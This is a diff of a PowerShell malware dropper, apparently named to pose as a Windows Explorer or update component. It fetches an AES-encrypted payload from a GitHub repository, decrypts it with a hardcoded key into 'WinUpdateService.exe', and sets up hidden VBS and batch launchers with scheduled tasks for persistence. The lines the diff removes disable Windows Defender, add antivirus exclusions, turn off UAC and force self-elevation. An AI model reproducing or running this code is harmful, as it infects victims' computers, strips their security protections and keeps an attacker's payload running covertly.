@@ -20,31 +20,19 @@ $randomPath = Get-Random -InputObject $paths
 $fullPath = Join-Path -Path $randomPath -ChildPath $randomProgram
 New-Item -Path $fullPath -ItemType Directory -Force | Out-Null
 
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
-    Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"' -Verb RunAs
-    exit
-}
+$icoUrl1 = "https://github.com/ibrahem1012/WindowsExplorer/raw/main/upd.ico"
+$icoPath1 = Join-Path -Path $fullPath -ChildPath "updata.ico"
+Invoke-WebRequest -Uri $icoUrl1 -OutFile $icoPath1
 
-Add-MpPreference -ExclusionPath "$env:SystemDrive\"
-Add-MpPreference -ExclusionPath "C:\"
-Add-MpPreference -ExclusionPath "$env:TEMP"
-Add-MpPreference -ExclusionPath "$env:APPDATA"
-Add-MpPreference -ExclusionPath "$env:SystemDrive\programdata\Windata"
-Add-MpPreference -ExclusionProcess "powershell.exe"
-Add-MpPreference -ExclusionPath "C:\ProgramData\GG-Win"
+$batContent = @"
+@echo off
+start """" `"$icoPath1`"
+exit
+"@
+$batPath = Join-Path -Path $fullPath -ChildPath "run_ico.bat"
+Set-Content -Path $batPath -Value $batContent -Force
 
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled /t REG_DWORD /d 0 /f
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v LockScreenToastEnabled /t REG_DWORD /d 0 /f
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\MSEdge" /v Enabled /t REG_DWORD /d 0 /f
-reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter" /v Enabled /t REG_DWORD /d 0 /f
-reg add "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 1 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v TamperProtection /t REG_DWORD /d 1 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-cls
+Start-Process -FilePath $batPath -WindowStyle Hidden
 
 function HexStringToByteArray([string]$hex) {
     $bytes = New-Object byte[] ($hex.Length / 2)
@@ -53,6 +41,7 @@ function HexStringToByteArray([string]$hex) {
     }
     return $bytes
 }
+
 function AES-Decrypt {
     param (
         [byte[]]$Data,
@@ -78,6 +67,7 @@ function AES-Decrypt {
         return $null
     }
 }
+
 $tempPath = "$env:TEMP\enc_payload.bin"
 Invoke-WebRequest -Uri "https://github.com/ibrahem1012/WindowsExplorer/raw/refs/heads/main/encrypted_payload.bin" -OutFile $tempPath
 $encBytes = [System.IO.File]::ReadAllBytes($tempPath)
@@ -86,6 +76,7 @@ $ivHex = "0102030405060708090a0b0c0d0e0f10"
 $key = HexStringToByteArray $keyHex
 $iv = HexStringToByteArray $ivHex
 $decBytes = AES-Decrypt -Data $encBytes -Key $key -IV $iv
+
 if ($decBytes -ne $null) {
     $outPath = Join-Path -Path $fullPath -ChildPath "WinUpdateService.exe"
     [System.IO.File]::WriteAllBytes($outPath, $decBytes)
@@ -95,25 +86,26 @@ if ($decBytes -ne $null) {
         Remove-Item $outPath -Force
     }
 }
+
 Remove-Item $tempPath -Force
 
-Set-Content -Path (Join-Path -Path $fullPath -ChildPath "$randomProgram.ps1") -Value $scriptContent -Force
-
-$vbsContent = @'
+$vbsContent = @"
 On Error Resume Next
-Dim arr, cmd, shell
-arr = Split("p,o,w,e,r,s,h,e,l,l", ",")
-cmd = Join(arr, "") & " -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """ & WScript.Arguments(0) & """"
-Set shell = CreateObject("WScript.Shell")
-shell.Run cmd, 0, False
-'@
+Dim shell
+Set shell = CreateObject(""WScript.Shell"")
+shell.Run ""`"$batPath`"", 0, False
+"@
+$vbsPath = Join-Path -Path $fullPath -ChildPath "$randomProgram.vbs"
+Set-Content -Path $vbsPath -Value $vbsContent -Force
 
-Set-Content -Path (Join-Path -Path $fullPath -ChildPath "$randomProgram.vbs") -Value $vbsContent -Force
-
-Start-Sleep 2
+$ps1Content = @"
+Start-Process -FilePath 'wscript.exe' -ArgumentList '`"$vbsPath`"' -WindowStyle Hidden
+"@
+$ps1Path = Join-Path -Path $fullPath -ChildPath "$randomProgram.ps1"
+Set-Content -Path $ps1Path -Value $ps1Content -Force
 
 try {
-    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$fullPath\$randomProgram.vbs`" `"$fullPath\$randomProgram.ps1`""
+    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $randomProgram -Force
 } catch {}
@@ -121,13 +113,9 @@ try {
 Start-Sleep 2
 
 $taskName2 = "${randomProgram}Startup"
-$vbsFullPath = "$fullPath\$randomProgram.vbs"
-$ps1FullPath = "$fullPath\$randomProgram.ps1"
-
 try {
-    schtasks /create /tn $taskName2 /tr "`"wscript.exe`" `"$vbsFullPath`" `"$ps1FullPath`"" /sc MINUTE /mo 45 /f
+    schtasks /create /tn $taskName2 /tr "`"$batPath`"" /sc MINUTE /mo 45 /f
 } catch {}
 
 Start-Sleep 5
-
 schtasks /run /tn $randomProgram
